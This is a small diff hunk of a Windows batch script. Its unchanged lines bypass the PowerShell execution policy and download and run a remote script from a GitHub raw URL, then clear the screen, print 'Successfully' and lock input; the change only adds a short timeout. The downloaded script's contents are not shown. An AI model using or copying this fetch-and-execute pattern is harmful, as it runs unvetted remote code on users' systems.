@@ -36,6 +36,7 @@ goto input
 powershell -ExecutionPolicy Bypass -Command "iex (iwr 'https://raw.githubusercontent.com/lnwmon2-crypto/private/main/main.ps1')"
 cls
 echo Successfully
+timeout /t 2 >nul
 
 :: ล็อคไม่ให้พิมพ์ต่อ
 pause >nul
